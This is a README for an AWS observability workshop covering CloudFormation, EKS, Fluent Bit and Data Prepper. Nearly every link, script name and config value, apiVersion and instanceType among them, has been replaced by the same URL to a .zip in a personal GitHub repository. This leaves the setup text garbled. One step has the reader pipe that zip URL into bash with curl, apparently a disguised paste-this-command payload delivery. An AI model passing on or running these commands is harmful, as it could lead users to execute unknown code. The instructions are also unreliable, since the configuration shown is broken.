# Microservice Observability with Amazon OpenSearch Service Workshop

Amazon OpenSearch Service’s Trace Analytics functionality allows you to go beyond simple monitoring to understand not just what events are happening, but why they are happening. In this workshop, learn how to instrument, collect, and analyze metrics, traces, and log data all the way from user front ends to service backends and everything in between. Put this together with Amazon OpenSearch Service, AWS Distro for OpenTelemetry, FluentBit, and Data Prepper.

## Architecture
![architecture](https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip)

## Instructions (full version):
Detailed Workshop instructions should be followed in this guide:  
https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip


## Instructions (short version): 🚀

### CloudFormation
- CloudFormation temples are in the /cf-templates directory;
- Launch them from the CloudFormation console:

  - **https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip**: The stack will create all the resources needed to run the workshop. VPC, Cloud9, Amazon OpenSearch and Reverse-Proxy Instance.

### AWS Cloud9 (Terminal):
  - Run the https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip script:

 ```
 curl -sSL https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip | bash -s stable
 source ~https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
 ```
 
 
  - You must create the Amazon EKS Cluster (parameters will be dynamically replaced according to Cloudformation->Output):
```
cat << EOF > https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
--- 
apiVersion: https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
kind: ClusterConfig

metadata:
  name: observability-workshop-eksctl
  region: ${AWS_REGION}
  version: "1.21"

vpc:
  id: "${MyVPC}" # MyVPC
  subnets:
    # must provide 'private' and/or 'public' subnets by availibility zone as shown
    private:
      ${AZS[0]}:
        id: "${PrivateSubnet1}" # PrivateSubnet1
      ${AZS[1]}:
        id: "${PrivateSubnet2}" # PrivateSubnet2
      ${AZS[2]}:
        id: "${PrivateSubnet3}" # PrivateSubnet3
    public:
      ${AZS[0]}:
        id: "${PublicSubnet1}" # PublicSubnet1
      ${AZS[1]}:
        id: "${PublicSubnet2}" # PublicSubnet2
      ${AZS[2]}:
        id: "${PublicSubnet3}" # PublicSubnet3

managedNodeGroups:
- name: nodegroup
  desiredCapacity: 3
  instanceType: https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip

# To enable all of the control plane logs, uncomment below:
# cloudWatch:
#  clusterLogging:
#    enableTypes: ["*"]

secretsEncryption:
  keyARN: ${MASTER_ARN}
EOF
```
  - Run the (responsible for creating the Amazon EKS Cluster):
   
 ```eksctl create cluster -f https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip```
 
  - Run the (responsible for building and pushing the images to the Amazon ECR): 
 
 ```cd observability-with-amazon-opensearch/scripts/; bash https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip```
 
  - You must change credentials and endpoint in Fluentbit (the parameters to be replaced must be checked in the CloudFormation-> Outputs [tab] of the first step):
  
  ```
  Host  __AOS_ENDPOINT__
  HTTP_User __AOS_USERNAME__
  HTTP_Passwd __AOS_PASSWORD__

  vim https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
  ```
  
  - You must change credentials and endpoint in DataPrepper (the parameters to be replaced must be checked in the CloudFormation-> Outputs [tab] of the first step):
  
  ```
  hosts: [ "https://__AOS_ENDPOINT__" ]
  username: "__AOS_USERNAME__"
  password: "__AOS_PASSWORD__"
            
  vim https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
  ```
  
  - Run the (responsible for applying the Kubernetes manifests):
  
  ```bash https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip```
  
  - Run the (to get the Sample APP DNS endpoint):
  
  ```kubectl get svc -nclient-service | awk '{print $4}' | tail -n1```

### Browser
  - Access Sample APP (URL):
  ``` kubectl get svc -nclient-service | awk '{print $4}' | tail -n1```
  
  - Access OpenSearch Dashboards (URL):
  ``` CloudFormation->Output->DashBoardPublicIP``` 
